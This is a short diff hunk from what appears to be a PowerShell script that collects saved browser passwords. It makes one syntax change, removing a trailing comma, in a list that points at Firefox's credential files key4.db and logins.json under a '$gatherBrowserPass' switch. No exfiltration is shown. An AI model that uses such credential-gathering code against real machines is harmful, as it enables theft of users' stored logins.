@@ -163,7 +163,7 @@ if ($gatherBrowserPass) {
             LoginDataPath = "$FirefoxCredsLocation\key4.db"
             LocalStatePath = "$FirefoxCredsLocation\logins.json"
             Prefix = "Firefox"
-        },
+        }
     )
 
     foreach ($browser in $browserData) {
